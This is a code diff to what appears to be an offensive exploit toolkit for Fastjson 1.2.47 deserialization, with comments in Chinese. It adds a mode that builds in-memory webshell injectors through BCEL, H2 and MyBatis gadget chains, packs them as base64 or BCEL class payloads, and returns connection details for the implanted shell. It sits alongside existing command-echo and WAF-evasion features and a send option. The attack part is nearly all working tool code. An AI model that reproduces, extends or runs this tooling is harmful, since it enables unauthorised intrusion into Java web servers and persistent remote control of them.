@@ -12,6 +12,11 @@ from fastjson_toolkit.poc.echo import (
     normalize_engine,
     supports_bytecode_echo,
 )
+from fastjson_toolkit.poc.memshell import (
+    build_memshell_delivery,
+    generate_memshell,
+    supports_1247_memshell,
+)
 from fastjson_toolkit.poc.v1_2_47.catalog import get_gadget, list_gadgets
 from fastjson_toolkit.poc.v1_2_47.models import (
     Poc1247GenerateOptions,
@@ -31,6 +36,7 @@ COMMON_NOTES = [
     "H2/C3P0 需 classpath 含对应依赖。",
     "getter：无期望类可用 $ref / JSONObject 作 key；有期望类需套 Currency"
     "（见 getter_trigger）。",
+    "内存马：BCEL/H2/MyBatis 链（不含 jdbc_rowset）；与回显互斥；默认内置 jar 生成。",
 ]
 
 
@@ -60,14 +66,49 @@ def generate_poc_1247(
 
     class_b64 = opts.class_b64
     bcel_code = opts.bcel_code
-    echo_on = bool(opts.echo)
+    memshell_on = bool(opts.memshell)
+    echo_on = bool(opts.echo) and not memshell_on
     engine = ""
     cmd_header = ""
     echo_bcel: Optional[str] = None
     echo_b64: Optional[str] = None
+    memshell_info: Optional[dict] = None
+    memshell_connect: Optional[str] = None
     notes = list(COMMON_NOTES)
 
-    if echo_on:
+    if memshell_on:
+        if opts.echo:
+            notes.append("memshell 与 echo 互斥，已优先内存马模式")
+        if not supports_1247_memshell(entry.id):
+            raise ValueError(
+                f"gadget={entry.id} 不支持内存马；"
+                "请选用 BCEL / MyBatis / H2（不含 jdbc_rowset）"
+            )
+        ms = generate_memshell(
+            backend=opts.ms_api,
+            server=opts.ms_server,
+            tool=opts.ms_tool,
+            shell_type=opts.ms_type,
+            url_pattern=opts.ms_path,
+            jdk=opts.ms_jdk,
+            static_initialize=True,
+        )
+        delivery = build_memshell_delivery(ms)
+        class_b64 = delivery.class_b64
+        # h2：仅 class_b64（INIT defineClass）；BCEL 链需要 bcel_code
+        bcel_code = None if entry.id == "h2_jdbc" else delivery.bcel_code
+        echo_b64 = class_b64
+        echo_bcel = bcel_code
+        memshell_info = ms.as_info_dict()
+        memshell_connect = ms.connect_info
+        notes.append(
+            f"已生成内存马 injector：{ms.injector_class} "
+            f"({ms.tool}/{ms.shell_type}/{ms.server})"
+        )
+        notes.extend(delivery.notes)
+        notes.append("连接信息：\n" + memshell_connect)
+
+    elif echo_on:
         if not supports_bytecode_echo(entry.id) and entry.id != "jdbc_rowset":
             raise ValueError(
                 f"gadget={entry.id} 不支持自动回显类生成；"
@@ -138,6 +179,9 @@ def generate_poc_1247(
         cmd_header=cmd_header,
         class_b64=echo_b64 or class_b64,
         bcel_code=echo_bcel or bcel_code,
+        memshell=memshell_on,
+        memshell_info=memshell_info,
+        memshell_connect=memshell_connect,
     )
 
 
@@ -151,6 +195,8 @@ def run_poc_1247(
         summary += f"；WAF: {' → '.join(gen.waf_techniques)}"
     if gen.echo:
         summary += f"；echo={gen.engine} header={gen.cmd_header}"
+    if gen.memshell:
+        summary += "；memshell=on"
     result = Poc1247SendResult(
         ok=True,
         gadget=gen.gadget,
@@ -169,6 +215,9 @@ def run_poc_1247(
         cmd_header=gen.cmd_header,
         class_b64=gen.class_b64,
         bcel_code=gen.bcel_code,
+        memshell=gen.memshell,
+        memshell_info=gen.memshell_info,
+        memshell_connect=gen.memshell_connect,
     )
     if not opts.send:
         return result
